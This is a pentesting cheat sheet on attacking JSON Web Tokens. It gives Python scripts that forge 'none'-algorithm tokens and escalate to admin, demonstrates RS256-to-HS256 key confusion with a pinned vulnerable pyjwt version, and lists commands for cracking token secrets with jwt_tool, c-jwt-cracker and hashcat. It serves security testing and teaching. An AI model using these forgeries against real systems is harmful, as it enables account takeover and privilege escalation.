# JWT - JSON Web Token

> JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

## JWT Format

JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`

Example : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

### Header

Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
"RS256" is used for asymetric purposes (RSA asymmetric encryption and private key signature).

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

### Payload

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

JWT Encoder – Decoder: `http://jsonwebtoken.io`

## JWT Signature - None algorithm

JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.

To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT.

However, this won't work unless you **remove** the signature

The following code is a basic test for a None algorithm.

```python
import jwt
import base64

def b64urlencode(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')

print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
```

Alternatively you can modify an existing JWT (be careful with the expiration time)

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
header, payload, signature  = jwt.split('.')

# Replacing the ALGO and the payload username
header  = header.decode('base64').replace('HS256',"none")
payload = (payload+"==").decode('base64').replace('test','admin')

header  = header.encode('base64').strip().replace("=","")
payload = payload.encode('base64').strip().replace("=","")

# 'The algorithm 'none' is not supported'
print( header+"."+payload+".")
```

## JWT Signature - RS256 to HS256

Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.

> The algorithm HS256 uses the secret key to sign and verify each message.
> The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

Note: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version

`pip install pyjwt==0.4.3`.

## Breaking JWT's secret

Encode/Decode JWT with the secret.

```python
import jwt
encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256') # encode with 'secret'

encoded = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE"
jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the secret key

# result
{u'admin': True, u'sub': u'1234567890', u'name': u'John Doe'}
```

### JWT tool

```bash
git clone https://github.com/ticarpi/jwt_tool
python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw /usr/share/wordlists/rockyou.txt
```

### JWT cracker

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
Secret is "Sn1f"
```

### Hashcat

> Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](twitter.com/hashcat/status/955154646494040065)

```bash
/hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
```

## Thanks

- [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- [WebSec CTF - Authorization Token - JWT Challenge](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- [Privilege Escalation like a Boss - October 27, 2018 - janijay007](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- [5 Easy Steps to Understanding JSON Web Token](https://medium.com/vandium-software/5-easy-steps-to-understanding-json-web-tokens-jwt-1164c0adfcec)
- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
